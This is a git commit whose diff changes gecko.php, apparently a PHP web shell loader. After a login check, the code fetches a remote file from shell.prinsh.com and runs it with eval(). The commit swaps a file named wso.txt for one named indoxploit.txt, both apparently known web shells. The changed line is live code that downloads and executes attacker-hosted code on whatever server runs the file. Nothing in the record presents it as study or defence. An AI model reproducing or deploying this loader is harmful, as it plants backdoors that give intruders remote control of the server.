7fd255069757aed5d53d8959cc16fa829e67c1a4
noviantikawulandari <123995313+mesumx10@users.noreply.github.com>
2024-04-05 20:26:51 +0700

    gecko.php

--- gecko.php
+++ gecko.php
@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://shell.prinsh.com/Nathan/wso.txt');
+    $a = geturlsinfo('https://shell.prinsh.com/Nathan/indoxploit.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
